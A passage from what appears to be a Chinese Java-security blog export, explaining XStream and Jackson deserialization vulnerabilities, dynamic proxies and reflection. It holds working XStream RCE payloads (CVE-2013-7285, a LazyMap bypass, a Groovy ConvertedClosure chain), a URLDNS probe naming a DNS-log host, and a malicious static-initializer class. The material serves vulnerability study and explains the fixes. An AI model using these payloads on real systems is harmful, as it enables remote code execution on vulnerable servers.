NullPointerException();\n\t\t@SuppressWarnings(&quot;unchecked&quot;)\n\t\t\tComparable&lt;? super K&gt; k = (Comparable&lt;? super K&gt;) key;\n\t\tdo {\n\t\t\tparent = t;\n\t\t\t// [9] 此处也会调用 compareTo\n\t\t\tcmp = k.compareTo(t.key);\n这里注意有两处地方都能触发 compareTo，分别是 [8] 和 [9]，\n两者的不同再于，当第一次像 TreeMap 中插入元素时，调用的是 [8]，此时它是自己和自己比较，所以 cmpareTo 的参数就是自身，这意味着后续 invoke 调用方法是的参数就是它自身，所以在前面的示例中，若是不先调用 set.add(&quot;foo&quot;); 插入一个字符串，自己插入代理对象，后续 invoke 中得到的参数是代理对象自身。因此若是利用的一个需要传递参数的方法，则不能使用 [8] 这个触发位置，好在前面利用的是 ProcessBuilder#start 方法，它是无参方法。\n而后续插入新的元素调用的是 [9]，所以如果你想使用 Runtime#exec 来执行命令，则可能需要用到 [9]，并且需要先在 TreeMap 中插入一个元素，假设为 foo，这里的 foo 则会成为 compareTo 的参数。『可以参考后面的 XStreamGroovyExec.java』\n了解这些内容后，只需将前面的 set 对象转换成编组之后的 XML 文档再交由 XStream 解组即可，来试试看吧\nXStreamTreeSetExec.java\n\nXStream &lt; 1.4.7\n\npublic static void main(String[] args) {\n\tString from =\n\t\t\t&quot;&lt;tree-set&gt;\\n&quot;\n\t\t\t\t\t+ &quot;    &lt;dynamic-proxy&gt;\\n&quot;\n\t\t\t\t\t+ &quot;    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\\n&quot;\n\t\t\t\t\t+ &quot;    &lt;handler class=\\&quot;java.beans.EventHandler\\&quot;&gt;\\n&quot;\n\t\t\t\t\t+ &quot;        &lt;target class=\\&quot;java.lang.ProcessBuilder\\&quot;&gt;\\n&quot;\n\t\t\t\t\t+ &quot;            &lt;command&gt;\\n&quot;\n\t\t\t\t\t+ &quot;                &lt;string&gt;calc&lt;/string&gt;\\n&quot;\n\t\t\t\t\t+ &quot;                &lt;string&gt;-a&lt;/string&gt;\\n&quot;\n\t\t\t\t\t+ &quot;                &lt;string&gt;calculator&lt;/string&gt;\\n&quot;\n\t\t\t\t\t+ &quot;            &lt;/command&gt;\\n&quot;\n\t\t\t\t\t+ &quot;        &lt;/target&gt;\\n&quot;\n\t\t\t\t\t+ &quot;        &lt;action&gt;start&lt;/action&gt;\\n&quot;\n\t\t\t\t\t+ &quot;    &lt;/handler&gt;\\n&quot;\n\t\t\t\t\t+ &quot;    &lt;/dynamic-proxy&gt;\\n&quot;\n\t\t\t\t\t+ &quot;&lt;/tree-set&gt;&quot;;\n \n\tObject resultXML = new XStream().fromXML(from);\n}\n运行之后命令被成功执行。观察调用栈会发现在解组时在 TreeMapConverter 中调用了 TreeMap#putAll 方法从而触发了 EventHandler#invoke 的执行。\n简化调用关系梳理\nXStream.fromXML\n  XStream.unmarshal\n\t// 调用 AbstractTreeMarshallingStrategy#unmarshal\n    marshallingStrategy.unmarshal\n \n      // 调用 TreeUnmarshaller#start\n      context.start(dataHolder);\n        // 调用 TreeUnmarshaller.convertAnother\n\t    convertAnother(null, type)\n \n          // 调用 AbstractReferenceUnmarshaller#convert\n          convert(parent, type, converter);\n            // 调用 TreeUnmarshaller#convert\n            super.convert(parent, type, converter);\n              // 调用 TreeSetConverter#unmarshal\n              converter.unmarshal(reader, this)\n                // 调用 TreeMapConverter.populateTreeMap 填充 TreeMap 触发代理对象，导致命令成功执行。\n                treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);\nCVE-2013-7285\n影响版本 XStream &lt; 1.4.7，在 1.4.10 版本中，若未初始化安全机制则同样受影响。其实前面提到的 Poc，就是 CVE-2013-7285\n&lt;tree-set&gt;\n    &lt;dynamic-proxy&gt;\n    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n    &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;\n        &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;\n            &lt;command&gt;\n                &lt;string&gt;open&lt;/string&gt;\n                &lt;string&gt;-a&lt;/string&gt;\n                &lt;string&gt;calculator&lt;/string&gt;\n            &lt;/command&gt;\n        &lt;/target&gt;\n        &lt;action&gt;start&lt;/action&gt;\n    &lt;/handler&gt;\n    &lt;/dynamic-proxy&gt;\n&lt;/tree-set&gt;\n修复方式\n\n修复内容见 Commit Merge fix for security vulnerability from HEAD.。\n\n修复的方式很简单，把 EventHandler 加入了『黑名单』，在 ReflectionConverter#canConvert 方法中如果待处理的类型为 EventHandler 则会拒绝。意味着 EventHandler 不会通过反射进行创建，即无法在解组时恢复 EventHandler 对象。\n\n如同 changes 中所说的一样\n\njava.bean.EventHandler no longer handled automatically because of severe security vulnerability.\n\n如何绕过？\n最开始的时候，已经提过原生反序列化中的 Gadget 几乎都可在 XStream 中使用增加『并未真实测试过所有』，这是因为 XStream 中的 SerializableConverter 会调用对象的 readObject 方法。当然如果能找到一个 EventHandler 的替代品，也可以轻易绕过。\n\nXStream 版本 1.4.7\n\n下面使用 LazyMapAnnotationExec.java 中的内容构造一个恶意的 XML 文档用于执行命令。文档内容如下\n&lt;sun.reflect.annotation.AnnotationInvocationHandler serialization=&quot;custom&quot;&gt;\n  &lt;sun.reflect.annotation.AnnotationInvocationHandler&gt;\n    &lt;default&gt;\n      &lt;memberValues class=&quot;dynamic-proxy&quot;&gt;\n        &lt;interface&gt;map&lt;/interface&gt;\n        &lt;handler class=&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot; serialization=&quot;custom&quot;&gt;\n          &lt;sun.reflect.annotation.AnnotationInvocationHandler&gt;\n            &lt;default&gt;\n              &lt;memberValues class=&quot;org.apache.commons.collections.map.LazyMap&quot; serialization=&quot;custom&quot;&gt;\n                &lt;unserializable-parents/&gt;\n                &lt;org.apache.commons.collections.map.LazyMap&gt;\n                  &lt;default&gt;\n                    &lt;factory class=&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;&gt;\n                      &lt;iTransformers&gt;\n                        &lt;org.apache.commons.collections.functors.ConstantTransformer&gt;\n                          &lt;iConstant class=&quot;java-class&quot;&gt;java.lang.Runtime&lt;/iConstant&gt;\n                        &lt;/org.apache.commons.collections.functors.ConstantTransformer&gt;\n                        &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;\n                          &lt;iMethodName&gt;getMethod&lt;/iMethodName&gt;\n                          &lt;iParamTypes&gt;\n                            &lt;java-class&gt;java.lang.String&lt;/java-class&gt;\n                            &lt;java-class&gt;[Ljava.lang.Class;&lt;/java-class&gt;\n                          &lt;/iParamTypes&gt;\n                          &lt;iArgs&gt;\n                            &lt;string&gt;getRuntime&lt;/string&gt;\n                            &lt;java-class-array/&gt;\n                          &lt;/iArgs&gt;\n                        &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;\n                        &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;\n                          &lt;iMethodName&gt;invoke&lt;/iMethodName&gt;\n                          &lt;iParamTypes&gt;\n                            &lt;java-class&gt;java.lang.Object&lt;/java-class&gt;\n                            &lt;java-class&gt;[Ljava.lang.Object;&lt;/java-class&gt;\n                          &lt;/iParamTypes&gt;\n                          &lt;iArgs&gt;\n                            &lt;null/&gt;\n                            &lt;object-array/&gt;\n                          &lt;/iArgs&gt;\n                        &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;\n                        &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;\n                          &lt;iMethodName&gt;exec&lt;/iMethodName&gt;\n                          &lt;iParamTypes&gt;\n                            &lt;java-class&gt;java.lang.String&lt;/java-class&gt;\n                          &lt;/iParamTypes&gt;\n                          &lt;iArgs&gt;\n                            &lt;string&gt;open -a calculator&lt;/string&gt;\n                          &lt;/iArgs&gt;\n                        &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;\n                      &lt;/iTransformers&gt;\n                    &lt;/factory&gt;\n                  &lt;/default&gt;\n                  &lt;map/&gt;\n                &lt;/org.apache.commons.collections.map.LazyMap&gt;\n              &lt;/memberValues&gt;\n              &lt;type&gt;java.lang.Override&lt;/type&gt;\n            &lt;/default&gt;\n          &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;\n        &lt;/handler&gt;\n      &lt;/memberValues&gt;\n      &lt;type&gt;java.lang.Override&lt;/type&gt;\n    &lt;/default&gt;\n  &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;\n&lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;\nXStreamLazyMapAnnotationExec.java\n上面的 XML 文档可以通过下面的代码生成，其中 getObject 方法与 LazyMapAnnotationExec.java 相同。\npublic static Object getObject() throws Exception {\n\t// ...\n}\npublic static void main(String[] args) throws Exception {\n\tSystem.out.println(new XStream().toXML(getObject()));\n}\n对生成的内容进行解组\npublic static void main(String[] args) throws Exception {\n\tXStream xStream = new XStream();\n\txStream.fromXML(xStream.toXML(getObject()));\n}\n会看到熟悉的异常内容。\n\nConvertedClosure\n除此之外，是否有 EventHandler 的替代品？有，它就是 groovy 中的 org.codehaus.groovy.runtime.ConvertedClosure\n\n需要 groovy &lt;= 2.4.3。\n\nConvertedClosure 继承自父类 ConversionHandler，它的 invoke 方法如下\npublic Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n\tVMPlugin plugin = VMPluginFactory.getPlugin();\n\tif (plugin.getVersion() &gt;= 7 &amp;&amp; this.isDefaultMethod(method)) {\n\t\t// ...\n\t} else if (!this.checkMethod(method)) {\n\t\t// [10] 若 method 不是 Object 类中定义的\n\t\ttry {\n\t\t\treturn this.invokeCustom(proxy, method, args);\n\t\t} catch (GroovyRuntimeException var6) {\n\t\t\tthrow ScriptBytecodeAdapter.unwrap(var6);\n\t\t}\n\t}\n\t// ...\n在 [10] 中，当被调用方法 method 不为 Object 类中定义的方法时则会调用抽象方法 invokeCustom，这里调用的是 ConvertedClosure#invokeCustom\npublic Object invokeCustom(Object proxy, Method method, Object[] args) throws Throwable {\n\treturn this.methodName != null &amp;&amp; !this.methodName.equals(method.getName()) ? null : ((Closure)this.getDelegate()).call(args);\n}\n当不满足条件 this.methodName != null &amp;&amp; !this.methodName.equals(method.getName()) 时会调用 ((Closure)this.getDelegate()).call(args) 方法，可以看到它会通过反射调用 doCall 方法\npublic V call(Object... args) {\n\ttry {\n\t\treturn (V)this.getMetaClass().invokeMethod(this, &quot;doCall&quot;, args);\n\t}\n\t// ...\n}\nClosure 是个抽象类，它自身的 doCall 方法没什么特别的， 在它的子类中有一个类型 MethodClosure，它的 doCall 方法如下\nprotected Object doCall(Object arguments) {\n\treturn InvokerHelper.invokeMethod(this.getOwner(), this.method, arguments);\n}\nInvokerHelper.invokeMethod 内部就是反射调用方法，那么可以通过控制 MethodClosure 的成员 method 来指定调用的方法达到任意方法调用的目的，从而造成命令执行。\nXStreamGroovyExec.java\n构造如下 XML 文件\n&lt;tree-set&gt;\n    &lt;string&gt;open -a calculator&lt;/string&gt;\n    &lt;dynamic-proxy&gt;\n        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n        &lt;handler class=&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;&gt;\n            &lt;methodName&gt;compareTo&lt;/methodName&gt;\n            &lt;delegate class=&quot;org.codehaus.groovy.runtime.MethodClosure&quot;&gt;\n                &lt;owner class=&quot;java.lang.Runtime&quot;&gt;\n                &lt;/owner&gt;\n                &lt;method&gt;exec&lt;/method&gt;\n            &lt;/delegate&gt;\n        &lt;/handler&gt;\n    &lt;/dynamic-proxy&gt;\n&lt;/tree-set&gt;\n测试一下\npublic class XStreamGroovyExec {\n    public static void main(String[] args) throws Exception {\n        String from =\n                &quot;&lt;tree-set&gt;\\n&quot;\n                        + &quot;    &lt;string&gt;open -a calculator&lt;/string&gt;\\n&quot;\n                        + &quot;    &lt;dynamic-proxy&gt;\\n&quot;\n                        + &quot;        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\\n&quot;\n                        + &quot;        &lt;handler class=\\&quot;org.codehaus.groovy.runtime.ConvertedClosure\\&quot;&gt;\\n&quot;\n                        + &quot;            &lt;methodName&gt;compareTo&lt;/methodName&gt;\\n&quot;\n                        + &quot;            &lt;delegate class=\\&quot;org.codehaus.groovy.runtime.MethodClosure\\&quot;&gt;\\n&quot;\n                        + &quot;                &lt;owner class=\\&quot;java.lang.Runtime\\&quot;&gt;\\n&quot;\n                        + &quot;                &lt;/owner&gt;\\n&quot;\n                        + &quot;                &lt;method&gt;exec&lt;/method&gt;\\n&quot;\n                        + &quot;            &lt;/delegate&gt;\\n&quot;\n                        + &quot;        &lt;/handler&gt;\\n&quot;\n                        + &quot;    &lt;/dynamic-proxy&gt;\\n&quot;\n                        + &quot;&lt;/tree-set&gt;&quot;;\n        XStream xStream = new XStream();\n        xStream.fromXML(from);\n    }\n}\nXStream 下的 URLDNS\n前面的 Gadget 都太『重』了，如果只是想检测 URLDNS 就足够。你可以像前面一样把 URLDNS 拿来给 XStream 编组后直接用，但那不够本地化。回想一下 URLDNS 的调用栈如下\nHashMap.readObject()\n    HashMap.putVal()\n      HashMap.hash()\n        URL.hashCode()\n\n所以只要能触发其它 3 个 方法之一就足够了。而 MapConverter 是用于转换 HashMap 的，查看它的 unmarshal 方法实现\npublic Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {\n\tMap map = (Map) createCollection(context.getRequiredType());\n\t// [8] 最终调用 putCurrentEntryIntoMap 将 entry 填入 map 中。\n\tpopulateMap(reader, context, map);\n\treturn map;\n}\n \nprotected void putCurrentEntryIntoMap(HierarchicalStreamReader reader, UnmarshallingContext context,\n\tMap map, Map target) {\n\treader.moveDown();\n\tObject key = readItem(reader, context, map);\n\treader.moveUp();\n \n\treader.moveDown();\n\tObject value = readItem(reader, context, map);\n\treader.moveUp();\n \n\t// [9] 调用 put 方法，若类型为 HashMap 则会进一步调用 HashMap#putVal\n\ttarget.put(key, value);\n}\n在 [9] 中，如果类型是 HashMap 则能够触发 HashMap#putVal 方法。那么构造如下 XML 即可，具体可见 XStream 下的 URLDNS。\n&lt;map&gt;\n  &lt;entry&gt;\n    &lt;url&gt;dwzpxhothu.dgrh3.cn&lt;/url&gt;\n    &lt;string&gt;foo&lt;/string&gt;\n  &lt;/entry&gt;\n&lt;/map&gt;\n执行后效果如下\n\nConverter 总结\n在前面的利用链的构造内容中主要提到了 3 个 Converter，TreeSetConverter 和 SerializableConverter 和 MapConverter，这 3 个 Converter 在 Gadget 中的作用是为了触发 compareTo、readObject、hashCode 方法，下面将相关的 Converter 列举出来：\n\nTreeSetConverter/TreeMapConverter：java.lang.Comparable#compareTo\nSerializableConverter：java.io.Serializable#readObject\nMapConverter：Object#hashCode\n\n\n可以将 Converter 理解为触发魔术方法的机制。\n\nJackson\nJackson 是 Fastxml 下的一个子项目，它为 Java 提供了一整套的 Json 数据处理的能力『当然它支持的数据格式早已不局限于 Json 了』，并且支持数据绑定『将 POJOs 与 Json 数据关联，也就是序列化机制』。\n\n有关 POJO 的概念，见 POJO vs JavaBeans\n\n而有关数据绑定的部分，则位于一个单独的子项目 jackson-databind，它是本节的讨论对象，后面为了方便，简称 jackson。\n在 Moritz Bechler 的研究报告中最早提到过与 jackson，并给出了相关利用链。在讨论具体的漏洞之前，先来简单了解一下 jackson 的序列化机制。\n\n下面使用的 jackson-databind 版本为 2.7.0。\n\nJacksonMarshaller.java\nJackson 在反序列化时要求类必须有默认的无参构造方法『不关心访问属性』，否则在反序列化时会产生如下异常\nException in thread &quot;main&quot; com.fasterxml.jackson.databind.JsonMappingException: No suitable constructor found for type [simple type, class com.trganda.pojo.Person]: can not instantiate from JSON object (missing default constructor or creator, or perhaps need to add/enable type information?)\n at [Source: {&quot;name&quot;:&quot;trganda&quot;,&quot;age&quot;:18,&quot;phone&quot;:{&quot;areaCode&quot;:1,&quot;local&quot;:1}}; line: 1, column: 2]\n\tat com.fasterxml.jackson.databind.JsonMappingException.from(JsonMappingException.java:216)\n\tat com.fasterxml.jackson.databind.deser.BeanDeserializerBase.deserializeFromObjectUsingNonDefault(BeanDeserializerBase.java:1130)\n\tat com.fasterxml.jackson.databind.deser.BeanDeserializer.deserializeFromObject(BeanDeserializer.java:298)\n\tat com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:133)\n\tat com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:3788)\n\tat com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:2779)\n\tat com.trganda.JacksonMarshaller.main(JacksonMarshaller.java:20)\n假设有两个 JavaBeans，PhoneNumber 和 Person\npublic class Person {\n    public String name;\n    public int age;\n    public PhoneNumber phone; // embedded POJO\n \n\t// standard constructor, getters and setters\n}\n \npublic class PhoneNumber {\n    public int areaCode;\n    public int local;\n\t\n\t// standard constructor, getters and setters\n}\n构造对象并对它进行序列化\npublic class JacksonMarshaller {\n \n    public static void main(String[] args) throws IOException {\n        PhoneNumber phoneNumber = new PhoneNumber(1, 1);\n        Person person = new Person(&quot;trganda&quot;, 18, phoneNumber);\n \n        ObjectMapper objectMapper = new ObjectMapper();\n        String result = objectMapper.writeValueAsString(person);\n        // pretty format\n        // String result = objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(person);\n        System.out.println(result);\n \n        Person person1 = objectMapper.readValue(result, Person.class);\n        System.out.println(person1);\n    }\n \n}\n输出如下\n{&quot;name&quot;:&quot;trganda&quot;,&quot;age&quot;:18,&quot;phone&quot;:{&quot;areaCode&quot;:1,&quot;local&quot;:1}}\n如果希望对输出结果进行美化，可以使用\nString result = objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(person);\n观察一下序列化后的数据，其中并没有类型信息，Jackson 在反序列化时需要在参数中指定类型信息，例如前面的 objectMapper.readValue(result, Person.class)。\nPolymorphic Typing\n而在反序列化中想要进行利用，需要能够构造指定类型，并直接或间接的调用相应的方法『魔术方法』。而 Jackson 是基于 JavaBeans 设计的，它在反序列化时会调用相应的 setter 方法『如果存在』。\n那么可以知道的是能够调用的魔术方法有两类：\n\n无参构造方法\nsetter 方法\n\n参考\n\ndocs.oracle.com/javase/tutorial/jaxb/intro/index.html 『Oracle 对 JAXB 的介绍文档』\ndocs.oracle.com/javase/8/docs/api/java/beans/XMLEncoder.html 『XMLEncoder 文档』\nen.wikipedia.org/wiki/Marshalling_(computer_science) 『Marshalling（编组）的概念』\nXStream\n\nweb.archive.org/web/20190718132219/http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html 『Dinis Cruz Blog 有关 XStream 远程代码执行漏洞文章的备份』\nblog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html 『如何使用 XStream Marshal/Unmarshal Java 对象』\ngithub.com/pwntester/RSA_RESTing/blob/master/Presentation/RESTing%20On%20Your%20Laurels%20Will%20Get%20You%20Powned9RSA.pdf 『RESTing on Your Laurels Will Get You Pwned 的 PPT 文档，RSA 2014 版本』\nwww.mail-archive.com/user@xstream.codehaus.org/msg00605.html 『XStream 如何在 Unmarshal 时调用方法』\nx-stream.github.io/converter-tutorial.html 『如何自定义 Converter』\nx-stream.github.io/CVE-2013-7285.html 『CVE-2013-7285』\ngithub.com/x-stream/xstream/commit/94666ae6dfe839410c73bdfeeb211374f04a2059 『CVE-2013-7285 修复 Commit』\n\n\nJackson\n\ncowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062 『On Jackson CVEs: Don’t Panic — Here is what you need to know』\ncowtowncoder.medium.com/jackson-2-11-features-40cdc1d2bdf3 『Jackson BLOCK_UNSAFE_POLYMORPHIC_BASE_TYPES 属性的介绍』\nadamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/ 『Exploiting the Jackson RCE: CVE-2017-7525』\ngithub.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1 『CVE-2017-7525 修复』\nmedium.com/@david.truong510/jackson-polymorphic-deserialization-91426e39b96a 『Jackson Polymorphic Deserialization』\n\n\n"},"articles/security/java/roadmap/Java-安全---动态代理":{"title":"Java 安全 - 动态代理","links":["articles/security/java/gadget/CommonsCollections1"],"tags":["java","proxy"],"content":"Java 动态代理是一种，运行时状态下，非侵入式的，对方法进行二次封装的技术。而所谓代理，是指对于原本要调用的方法，进行『隐藏』，可在调用真正的方法前/后进行代理，从而实现其它操作。例如，Benchmark 测试，功能拓展。动态代理被许多框架中广泛使用，如 Spring。\nInvocationHandler\n使用动态代理需要先实现 java.lang.reflect.InvocationHandler 接口\npublic class DynamicInvocationHandler implements InvocationHandler {\n\t@Override\n\tpublic Object invoke(Object proxy, Method method, Object[] args)\n\t\t\tthrows Throwable {\n\t\tSystem.out.println(&quot;Invoked method: &quot; + method.getName());\n \n\t\treturn 42;\n\t}\n}\n该接口提供一个 invoke 方法，当通过代理对象调用方法时，会转入该方法进行处理。\n下面创建一个代理对象实例，借助 java.lang.reflect.Proxy 提供的工厂方法 newProxyInstance\nMap proxyInstance = (Map) Proxy.newProxyInstance(\n  DynamicProxy.class.getClassLoader(),\n  new Class[] { Map.class },\n  new DynamicInvocationHandler());\n上面创建的代理对象，代理的是 Map 接口类型，之后可通过该对象正常调用 Map 接口中的方法。\nproxyInstance.put(&quot;hello&quot;, &quot;world&quot;);\n不过注意，刚刚创建的 DynamicInvocationHandler 并没有去包装需要被代理的对象，也没有真的执行 put 方法，只是记录了它而已。\n运行一下，得到如下输出：\n\nAnnotationInvocationHandler\n在 CC1 - AnnotationInvocationHandler 中介绍过这个 AnnotationInvocationHandler 了，它就是一个实现了 InvocationHandler 接口动态代理 Handler。\n并且通过成员 memberValues 来存储需要被代理类操作的对象。\nprivate final Map&lt;String, Object&gt; memberValues;\nTiming Dynamic Proxy Example\n下面是一个更具体的例子，通过动态代理，记录对象中方法的执行时间\npublic class TimingDynamicInvocationHandler implements InvocationHandler {\n \n    private static Logger LOGGER = LoggerFactory.getLogger(\n      TimingDynamicInvocationHandler.class);\n \n    private final Map&lt;String, Method&gt; methods = new HashMap&lt;&gt;();\n \n    private Object target;\n \n    public TimingDynamicInvocationHandler(Object target) {\n        this.target = target;\n \n\t\t// get all methods of target\n        for(Method method: target.getClass().getDeclaredMethods()) {\n            this.methods.put(method.getName(), method);\n        }\n    }\n \n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args)\n      throws Throwable {\n        long start = System.nanoTime();\n        // invoke the method and get the result\n        Object result = methods.get(method.getName()).invoke(target, args);\n        long elapsed = System.nanoTime() - start;\n \n        LOGGER.info(&quot;Executing {} finished in {} ns&quot;, method.getName(),\n          elapsed);\n \n        return result;\n    }\n}\n在 TimingDynamicInvocationHandler 的构造方法中，首先获取传入对象的所有方法并记录下来。当通过代理调用方法时，会进入 invoke，在 invoke 方法中，首先根据传入的方法名称和参数，调用对应的方法，并记录执行所花费的时间\n下面的示例，通过 TimingDynamicInvocationHandler 代理了 HashMap 和 String 的中的接口，Map 和 CharSequence。\nMap mapProxyInstance = (Map) Proxy.newProxyInstance(\n  DynamicProxyTest.class.getClassLoader(), new Class[] { Map.class },\n  new TimingDynamicInvocationHandler(new HashMap&lt;&gt;()));\n \nmapProxyInstance.put(&quot;hello&quot;, &quot;world&quot;);\n \nCharSequence csProxyInstance = (CharSequence) Proxy.newProxyInstance(\n  DynamicProxyTest.class.getClassLoader(),\n  new Class[] { CharSequence.class },\n  new TimingDynamicInvocationHandler(&quot;Hello World&quot;));\n \ncsProxyInstance.length();\n参考\n\nDynamic Proxies in Java | Baeldung\n"},"articles/security/java/roadmap/Java-安全---反射":{"title":"Java 安全 - 反射","links":[],"tags":["java","reflect"],"content":"反射，是反序列化的基础，了解 Java 的反射机制能够更好的理解反序列化漏洞。\n反射是一种运行时机制，能够让程序在运行时了解自身的结构。具体点来讲，一个类的方法可以在运行时查看自身所属类的有哪些成员，哪些方法，甚至是执行这些方法。该机制的特点是，为 Java 提供了类似动态语言的特性。\n反射相关的工具类主要位于 java.lang.reflect 包和 java.lang.Class 中。\n获取 Class 对象\npublic void execute(String className, String methodName) throws Exception {\n    Class clazz = Class.forName(className);\n    clazz.getMethod(methodName).invoke(clazz.newInstance());\n}\n上面的代码展示了如何在 Java 中使用反射，这段代码根据传入的参数，获取指定类的指定方法。其中使用了几个常用的反射方法：\n\njava.lang.Class#forName()：获取 Class 对象\njava.lang.Class#getMethod()：获取 Class 对象中的方法\njava.lang.reflect.Method#invoke()：调用从 Class 中获取的方法\njava.lang.Class#newInstance()：实例化一个 Class 对象\n\n\njava.lang.Class 是对 Java 字节码的一种抽象。\n\nforName() 方法并不是获取 Class 对象的唯一方式，Java 中获取 Class 对象的方法有以下几种：\n\njava.lang.Class#forName()\nObject.class：已知类名，并且它已经被加载的情况下，通过访问它的 class 属性即可获取它的 Class 对象。（不能算作反射，不具备动态特性）\nobj.getClass()：上下午中已有实例化的对象 obj，调用它的 getClass() 方法\n\n\n在安全研究中，我们使⽤用反射的一⼤目的，就是绕过某些沙盒。⽐如，上下⽂中如果只有 Integer 类型的 数字，我们如何获取到可以执⾏命令的 Runtime 类呢？也许可以这样 (伪代码)：1.getClass().forName(&quot;java.lang.Runtime&quot;)。—— p 牛\n\nforName() 方法有两个重载形式，\npublic static Class&lt;?&gt; forName(String className);\npublic static Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader)\n两种形式在下面的参数情况下作用是等价的\nforName(name)\n// 等价\nforName(name, true, loader)\n第二个方法的后两个参数，initialize 表示是否对类进行初始化『注意不是实例化』，loader 表示类加载器，告诉 Java 虚拟机如何找到并加载对应的类，后面还会提及。\n\n这部分内容和 Java 虚拟机的工作原理有关，可以参看《深入理解 JVM 虚拟机》。\n\n下面通过一段代码加深对 initialize 的理解，考虑下面的类 InitializeTest，如果使用 forName() 加载它会执行哪部分的代码？\npublic class Initialization {\n    {\n        System.out.println(&quot;InitializeTest Block&quot;);\n    }\n \n    static {\n        System.out.println(&quot;InitializeTest Static Block&quot;);\n    }\n \n    public InitializeTest() {\n        System.out.println(&quot;InitializeTest Constructor&quot;);\n    }\n}\n运行下面的代码\npublic class ReflectTest {\n \n    @Test\n    public void reflection() throws ClassNotFoundException {\n        Class.forName(&quot;com.trganda.roadmap.reflection.Initialization&quot;, true, ReflectTest.class.getClassLoader());\n        // new Initialization();\n    }\n}\n可以看到，只有 static 代码块被执行了。\n\n而由 {} 包裹的代码块会在实例化对象时执行，且早于构造函数内的语句。可以通过删除注释来验证这一点。\n\n所以，会经常看到一些恶意类会将代码放在类的全局静态代码块中，假设下面代码的 name 参数可控\npublic void ref(String name) throws Exception {\n    Class.forName(name);\n}\n那么可以让它加载下面这个类 TouchFile，至于 TouchFile 是如何进入目标类加载路径的就是另一回事情了。\nimport java.lang.Runtime;\nimport java.lang.Process;\npublic class TouchFile {\n    static {\n        try {\n            Runtime rt = Runtime.getRuntime();\n            String[] commands = {&quot;touch&quot;, &quot;/tmp/success&quot;};\n            Process pc = rt.exec(commands);\n            pc.waitFor();\n        } catch (Exception e) {\n            // do nothing\n} }\n}\n方法调用\n反射最大的作用之一就是调用类的方法，包括构造方法，公有或私有的方法。\n获取构造方法\n在调用一个类对象的方法之前，首先需要一个实例化的对象，而通过反射来获取一个实例化的对象有两种方式：\n\njava.lang.Class#newInstance()\njava.lang.reflect.Constructor#newInstance()\n\njava.lang.Class#newInstance() 方式会调用类的无参构造函数，并返回一个实例化对象。比如对于 Runtime，通过这种方法创建一个 Runtime 对象\nClass&lt;?&gt; clazz = Class.forName(&quot;java.lang.Runtime&quot;);\n \n// This will lead exception &quot;java.lang.IllegalAccessException: Classs\n// com.trganda.roadmap.reflection.ReflectTest can not access a member of class\n// java.lang.Runtime with modifiers &quot;private&quot;&quot;\nRuntime rt = (Runtime) clazz.newInstance();\n但是，这样会导致报错\ncan not access a member of class java.lang.Runtime with modifiers &quot;private&quot;\n\tat sun.reflect.Reflection.ensureMemberAccess(Reflection.java:102)\n\tat java.lang.Class.newInstance(Class.java:436)\n\tat ReflectTest.main(ReflectTest.java:10)\n\n原因是 java.lang.Class#newInstance() 只会调用公开且无参的构造方法，而 Runtime 是一个单例模式设计的类，没有公开的构造方法。不过，可以通过调用 Runtime.getRuntim() 的方式获取 Runtime 对象，\nClass&lt;?&gt; clazz = Class.forName(&quot;java.lang.Runtime&quot;);\nclazz.getMethod(&quot;exec&quot;,\nString.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),\n&quot;calc.exe&quot;);\n而很多类的构造函数可能并不满足成功调用 java.lang.Class#newInstance() 的条件，此时需要借助第二种方式，以 java.lang.ProcessBuilder 来进行演示，它有两个构造函数，虽然是公开的，但是都需要传递参数\npublic ProcessBuilder(List&lt;String&gt; command) {\n\t\tif (command == null)\n\t\t\t\tthrow new NullPointerException();\n\t\tthis.command = command;\n}\n \npublic ProcessBuilder(String... command) {\n\t\tthis.command = new ArrayList&lt;&gt;(command.length);\n\t\tfor (String arg : command)\n\t\t\t\tthis.command.add(arg);\n}\n这里需要借助 java.lang.Class#getConstructor 方法获取指定构造方法，再调用 java.lang.reflect.Constructor#newInstance() 获取实例化对象。\nClass&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);\n        ((ProcessBuilder)\n                        clazz.getConstructor(List.class)\n                                .newInstance(\n                                        Arrays.asList(&quot;open -a calculator&quot;))).start();\n上面的代码用到了 Java 里的强制类型转换，有时候利用漏洞的时候『在表达式上下文中』是没有这种语法的。此时可以继续利用反射来完成这一步。\nClass&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);\n        // with type cast\n        clazz.getMethod(&quot;start&quot;)\n                .invoke(\n                        clazz.getConstructor(List.class)\n                                .newInstance(\n                                        